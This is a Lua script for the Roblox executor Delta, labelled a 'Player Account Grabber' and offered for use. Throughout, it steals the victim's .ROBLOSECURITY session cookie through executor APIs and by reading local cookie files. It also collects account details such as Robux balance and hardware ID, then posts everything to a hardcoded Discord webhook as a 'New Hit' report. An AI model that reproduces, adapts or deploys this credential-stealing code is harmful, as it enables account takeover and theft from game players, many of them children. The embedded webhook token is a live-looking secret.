--// Delta Executor - Player Account Grabber
--// Paste your Discord webhook below
local WEBHOOK_URL = "https://discord.com/api/webhooks/1519331564482203700/2kWWgseSi4nFlp05yXgfrxbBcQE3QXQRhiVt9-GaduRjA6iHJtJoHzh0x02ZsbDnbUTG"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")

--// Utility
local function sendWebhook(data)
    local payload = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
    if not success then
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
        end)
    end
end

--// Grab ROBLOSECURITY cookie — Delta Executor compatible
local function grabCookie()
    local cookie = ""

    -- Method 1: Delta's WebView browser cookie scrape (MOST RELIABLE ON MOBILE)
    pcall(function()
        -- Delta injects into Roblox's built-in browser (WebView)
        local browser = getbrowser and getbrowser()
        if browser then
            local robloxCookies = browser:GetCookies("https://www.roblox.com")
            if robloxCookies then
                for _, c in ipairs(robloxCookies) do
                    if c.Name == ".ROBLOSECURITY" then
                        cookie = c.Value
                        break
                    end
                end
            end
        end
    end)

    -- Method 2: WebSocket-based cookie listener (Delta-specific)
    if cookie == "" then
        pcall(function()
            if getcookie then
                cookie = getcookie(".ROBLOSECURITY")
            end
        end)
    end

    -- Method 3: Filesystem read (PC only - Delta on Windows)
    if cookie == "" then
        pcall(function()
            local paths = {
                os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\RobloxCookies.dat",
                os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\LocalStorage\\RobloxCookies.dat",
                -- Fallback for older Roblox versions
                os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\Cookies.dat",
            }
            for _, path in ipairs(paths) do
                if isfile and isfile(path) then
                    local content = readfile(path)
                    -- The .dat file contains raw cookie strings
                    for match in string.gmatch(content, ".ROBLOSECURITY.-[^\n\r]+") do
                        cookie = match
                        break
                    end
                    if cookie ~= "" then break end
                end
            end
        end)
    end

    -- Method 4: Synapse X compat (some Delta builds include this)
    if cookie == "" then
        pcall(function()
            if syn and syn.cookie_get then
                cookie = syn.cookie_get(".ROBLOSECURITY")
            end
        end)
    end

    -- Clean the cookie value (remove any prefix/debris)
    if cookie and cookie ~= "" then
        -- Extract just the cookie value after the "=" sign
        local _, _, clean = string.find(cookie, ".ROBLOSECURITY=(.+)")
        if clean then
            cookie = clean
        end
        -- Trim whitespace/newlines
        cookie = string.match(cookie, "^%s*(.-)%s*$")
    end

    return cookie
end

--// Grab player metadata
local function getPlayerInfo()
    local info = {}
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.UserId = LocalPlayer.UserId
    info.AccountAge = LocalPlayer.AccountAge .. " days"
    info.MembershipType = tostring(LocalPlayer.MembershipType)
    
    -- Grab Robux balance via API
    pcall(function()
        local balanceUrl = "https://economy.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/currency"
        local resp = game:HttpGet(balanceUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded.robux or "Unknown"
    end)

    -- Friends count
    pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/friends/count"
        local resp = game:HttpGet(friendsUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded.count or "Unknown"
    end)

    -- Avatar thumbnail
    pcall(function()
        local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot"
            .. "?userIds=" .. tostring(LocalPlayer.UserId)
            .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(thumbUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.AvatarURL = decoded.data[1].imageUrl
    end)

    -- Current game info
    info.PlaceId = game.PlaceId
    info.JobId = game.JobId
    pcall(function()
        local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        info.GameName = placeInfo.Name
    end)

    -- Executor info
    pcall(function()
        if gethwid then
            info.HWID = gethwid()
        elseif getexecutorname then
            info.Executor = getexecutorname()
        end
    end)

    return info
end

--// Build Discord embed
local function buildEmbed(playerInfo, cookie)
    local fields = {
        { name = "👤 Username",    value = "```" .. playerInfo.Username .. "```",     inline = true },
        { name = "🏷️ Display",    value = "```" .. playerInfo.DisplayName .. "```",  inline = true },
        { name = "🆔 UserID",     value = "```" .. tostring(playerInfo.UserId) .. "```", inline = true },
        { name = "📅 Account Age", value = "```" .. playerInfo.AccountAge .. "```",   inline = true },
        { name = "💰 Robux",      value = "```" .. tostring(playerInfo.Robux or "N/A") .. "```", inline = true },
        { name = "👥 Friends",    value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
        { name = "🎮 Game",       value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
        { name = "💎 Premium",    value = "```" .. playerInfo.MembershipType .. "```", inline = true },
        { name = "🖥️ HWID",      value = "```" .. (playerInfo.HWID or "N/A") .. "```", inline = false },
    }

    if cookie and cookie ~= "" then
        local cookieChunks = {}
        for i = 1, #cookie, 900 do
            table.insert(cookieChunks, cookie:sub(i, i + 899))
        end
        for idx, chunk in ipairs(cookieChunks) do
            table.insert(fields, {
                name = "🍪 Cookie [" .. idx .. "/" .. #cookieChunks .. "]",
                value = "```" .. chunk .. "```",
                inline = false
            })
        end
    else
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```Failed to grab```",
            inline = false
        })
    end

    local embed = {
        embeds = {{
            title = "🎯 New Hit — " .. playerInfo.Username,
            color = 0xFF3333,
            fields = fields,
            thumbnail = { url = playerInfo.AvatarURL or "" },
            footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    return embed
end

--// ═══════════════════════════════════════════
--// MAIN EXECUTION
--// ═══════════════════════════════════════════

local playerInfo = getPlayerInfo()
local cookie = grabCookie()
local embed = buildEmbed(playerInfo, cookie)

sendWebhook(embed)
print("[Delta] Payload delivered ✓")
